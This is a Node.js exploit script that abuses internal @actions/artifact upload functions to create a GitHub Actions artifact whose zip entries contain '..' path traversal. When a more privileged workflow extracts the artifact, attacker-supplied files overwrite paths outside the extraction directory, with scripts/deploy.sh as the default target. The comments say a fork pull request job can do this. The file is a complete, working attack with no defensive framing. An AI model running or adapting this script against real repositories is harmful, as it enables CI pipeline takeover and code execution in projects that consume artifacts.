#!/usr/bin/env node
// Uploads a crafted artifact zip through the same @actions/artifact internals that
// actions/upload-artifact uses, but with handcrafted entry names containing "..".
// An unprivileged job that controls its own workflow (e.g. a fork PR) can do this.
const fs = require('fs')
const path = require('path')

const A = '@actions/artifact'
const { createZipUploadStream } = require(`${A}/lib/internal/upload/zip`)
const { uploadZipToBlobStorage } = require(`${A}/lib/internal/upload/blob-upload`)
const { internalArtifactTwirpClient } = require(`${A}/lib/internal/shared/artifact-twirp-client`)
const { getBackendIdsFromToken } = require(`${A}/lib/internal/shared/util`)
const { StringValue } = require(`${A}/lib/generated`)

async function main() {
  const name = process.env.INPUT_NAME || 'fork-www-dist'
  const pairs = (process.env.INPUT_PAIRS || 'payload/deploy.sh->scripts/deploy.sh').split(',')
  const extractDir = path.join(process.env.RUNNER_TEMP, process.env.INPUT_EXTRACT_DIR || 'fork-www-dist')
  const workspace = process.env.GITHUB_WORKSPACE

  const spec = []
  for (const pair of pairs) {
    const [src, target] = pair.split('->')
    const sourcePath = path.join(workspace, src.trim())
    const t = target.trim()
    const targetAbs = t.startsWith('/') ? t : path.join(workspace, t)
    const destinationPath = 'x/' + path.relative(path.join(extractDir, 'x'), targetAbs)
    const resolved = path.join(extractDir, destinationPath)
    if (resolved !== targetAbs) throw new Error(`path computation mismatch: ${resolved} != ${targetAbs}`)
    console.log(`zip entry ${JSON.stringify(destinationPath)} resolves to ${resolved}`)
    spec.push({ sourcePath, destinationPath, stats: fs.lstatSync(sourcePath) })
  }
  // one benign member that stays inside the extraction dir
  const benign = path.join(workspace, 'payload', 'index.html')
  spec.push({ sourcePath: benign, destinationPath: 'index.html', stats: fs.lstatSync(benign) })

  const backendIds = getBackendIdsFromToken()
  const client = internalArtifactTwirpClient()
  const createResp = await client.CreateArtifact({
    workflowRunBackendId: backendIds.workflowRunBackendId,
    workflowJobRunBackendId: backendIds.workflowJobRunBackendId,
    name,
    version: 4
  })
  if (!createResp.ok) throw new Error('CreateArtifact: response not ok')
  const zipStream = await createZipUploadStream(spec)
  const uploadResult = await uploadZipToBlobStorage(createResp.signedUploadUrl, zipStream)
  const finalizeReq = {
    workflowRunBackendId: backendIds.workflowRunBackendId,
    workflowJobRunBackendId: backendIds.workflowJobRunBackendId,
    name,
    size: uploadResult.uploadSize ? uploadResult.uploadSize.toString() : '0'
  }
  if (uploadResult.sha256Hash) finalizeReq.hash = StringValue.create({ value: `sha256:${uploadResult.sha256Hash}` })
  const finalizeResp = await client.FinalizeArtifact(finalizeReq)
  if (!finalizeResp.ok) throw new Error('FinalizeArtifact: response not ok')
  console.log(`artifact ${name} uploaded id=${finalizeResp.artifactId} size=${uploadResult.uploadSize}`)
}
main().catch(e => { console.error(e); process.exit(1) })
